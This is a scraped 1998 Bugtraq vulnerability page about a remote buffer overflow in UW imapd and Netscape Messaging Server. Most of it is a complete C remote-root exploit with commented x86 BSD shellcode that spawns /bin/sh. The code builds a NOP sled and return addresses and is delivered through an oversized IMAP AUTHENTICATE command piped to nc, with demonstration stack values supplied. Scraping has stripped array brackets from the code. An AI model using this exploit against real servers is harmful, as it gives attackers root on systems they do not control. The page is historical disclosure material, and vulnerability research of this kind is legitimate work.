#bid130<p><b><span style="font-size: 18pt;">imapd Buffer Overflow Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/130/info">info</a><br><a href="http://www.securityfocus.com/bid/130/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/130/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/130/solution">solution</a><br><a href="http://www.securityfocus.com/bid/130/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
<table border="0" cellpadding="4" cellspacing="0">
<tr>
<td>
<span class="label">Bugtraq ID:</span>
</td>
<td>
				130
			</td>
</tr>
<tr>
<td>
<span class="label">Class:</span>
</td>
<td>
				Boundary Condition Error
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">CVE:</span>
</td>
<td>
</td>
</tr>
<tr>
<td>
<span class="label">Remote:</span>
</td>
<td>
				Yes
			</td>
</tr>
<tr>
<td>
<span class="label">Local:</span>
</td>
<td>
				Unknown
			</td>
</tr>
<tr>
<td>
<span class="label">Published:</span>
</td>
<td>
				Jul 17 1998 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Updated:</span>
</td>
<td>
				Jul 17 1998 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Credit:</span>
</td>
<td>
				This vulnerability was initially posted to the Bugtraq mailing list on July 17, 1998 by Anonymous (nobody@REPLAY.COM).

 CERT issued an advisory shortly thereafter, on July 20, 1998
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">Vulnerable:</span>
</td>
<td>
				
					University of Washington imapd 10.234 <br/>
					
				
					Netscape Messaging Server 3.55 <br/>
</td>
</tr>
<tr>
<td colspan="2">
<div class="breakline"></div>
</td>
</tr>
<tr valign="top">
<td>
<span class="label">Not Vulnerable:</span>
</td>
<td>
</td>
</tr>
</table>
</div><br><br>#<br>#<a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x1000/130/imap-linux.c">#exploit_imap-linux.c</a><br><br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
	 /**<br/>***  i386 BSD remote root exploit for UW imapd IMAP 4.1 server<br/>***<br/>***  This is *not* the same bug addressed in CERT Advisory CA-97.09!<br/>***<br/>***  Usage:  % (imappy nop esp offset; cat) | nc hostname 143<br/>***<br/>***  where nop is the number of NOP opcodes to place at the start of the<br/>***  exploit buffer (I use 403), esp is the %esp stack pointer value, and<br/>***  offset is the number of bytes to add to esp to calculate your target<br/>***  %eip.<br/>***<br/>***  Demonstration values for UW imapd 10.234 (part of Pine 4.00):<br/>***<br/>***      imappy 403 0xefbfd5e8 100    (BSDI 3.0)<br/>***      imappy 403 0xefbfd4b8 100    (FreeBSD 2.2.5)<br/>***<br/>***  THIS CODE FOR EDUCATIONAL USE ONLY IN AN ETHICAL MANNER<br/>***<br/>***  Cheez Whiz<br/>***  cheezbeast@hotmail.com<br/>***<br/>***  July 16, 1998<br/>**/<br/><br/>#include &lt;stdio.h&gt;<br/>#include &lt;stdlib.h&gt;<br/>#include &lt;limits.h&gt;<br/>#include &lt;string.h&gt;<br/><br/>#define BUFLEN (2*1024)<br/>#define NOP 0x90<br/><br/>char shell =<br/>/*  0 */ "\xeb\x34"                      /* jmp springboard              */<br/>/* start:                                                                */<br/>/*  2 */ "\x5e"                          /* popl %esi                    */<br/>/*  3 */ "\x8d\x1e"                      /* leal (%esi),%ebx             */<br/>/*  5 */ "\x89\x5e\x0b"                  /* movl %ebx,0xb(%esi)          */<br/>/*  8 */ "\x31\xd2"                      /* xorl %edx,%edx               */<br/>/* 10 */ "\x89\x56\x07"                  /* movl %edx,0x7(%esi)          */<br/>/* 13 */ "\x89\x56\x0f"                  /* movl %edx,0xf(%esi)          */<br/>/* 16 */ "\x89\x56\x14"                  /* movl %edx,0x14(%esi)         */<br/>/* 19 */ "\x88\x56\x19"                  /* movb %dl,0x19(%esi)          */<br/>/* 22 */ "\x31\xc0"                      /* xorl %eax,%eax               */<br/>/* 24 */ "\xb0\x7f"                      /* movb $0x7f,%al               */<br/>/* 26 */ "\x20\x46\x01"                  /* andb %al,0x1(%esi)           */<br/>/* 29 */ "\x20\x46\x02"                  /* andb %al,0x2(%esi)           */<br/>/* 32 */ "\x20\x46\x03"                  /* andb %al,0x3(%esi)           */<br/>/* 35 */ "\x20\x46\x05"                  /* andb %al,0x5(%esi)           */<br/>/* 38 */ "\x20\x46\x06"                  /* andb %al,0x6(%esi)           */<br/>/* 41 */ "\xb0\x3b"                      /* movb $0x3b,%al               */<br/>/* 43 */ "\x8d\x4e\x0b"                  /* leal 0xb(%esi),%ecx          */<br/>/* 46 */ "\x89\xca"                      /* movl %ecx,%edx               */<br/>/* 48 */ "\x52"                          /* pushl %edx                   */<br/>/* 49 */ "\x51"                          /* pushl %ecx                   */<br/>/* 50 */ "\x53"                          /* pushl %ebx                   */<br/>/* 51 */ "\x50"                          /* pushl %eax                   */<br/>/* 52 */ "\xeb\x18"                      /* jmp exec                     */<br/>/* springboard:                                                          */<br/>/* 54 */ "\xe8\xc7\xff\xff\xff"          /* call start                   */<br/>/* data:                                                                 */<br/>/* 59 */ "\x2f\xe2\xe9\xee\x2f\xf3\xe8"  /* DATA (disguised /bin/sh)     */<br/>/* 66 */ "\x01\x01\x01\x01"              /* DATA                         */<br/>/* 70 */ "\x02\x02\x02\x02"              /* DATA                         */<br/>/* 74 */ "\x03\x03\x03\x03"              /* DATA                         */<br/>/* exec:                                                                 */<br/>/* 78 */ "\x9a\x04\x04\x04\x04\x07\x04"; /* lcall 0x7,0x0                */<br/><br/>char bufBUFLEN;<br/>unsigned long int nop, esp;<br/>long int offset;<br/><br/>void<br/>main (int argc, char *argv)<br/>{<br/>    int i;<br/><br/>    if (argc &lt; 4) {<br/>        printf("usage: %s nop esp offset\n", argv0);<br/>        return;<br/>    }<br/><br/>    nop = strtoul(argv1, NULL, 0);<br/>    esp = strtoul(argv2, NULL, 0);<br/>    offset = strtol(argv3, NULL, 0);<br/><br/>    memset(buf, NOP, BUFLEN);<br/>    memcpy(buf+nop, shell, strlen(shell));<br/>    for (i = nop+strlen(shell); i &lt; BUFLEN - 4; i += 4)<br/>        *((int *) &amp;bufi) = esp + offset;<br/><br/>    printf("* AUTHENTICATE {%d}\r\n", BUFLEN);<br/>    for (i = 0; i &lt; BUFLEN; i++)<br/>        putchar(bufi);<br/>    printf("\r\n");<br/><br/>    return;<br/>}
	
		<ul>
<li><a href="/data/vulnerabilities/exploits/imap-linux.c">/data/vulnerabilities/exploits/imap-linux.c</a></li>
</ul>
</div>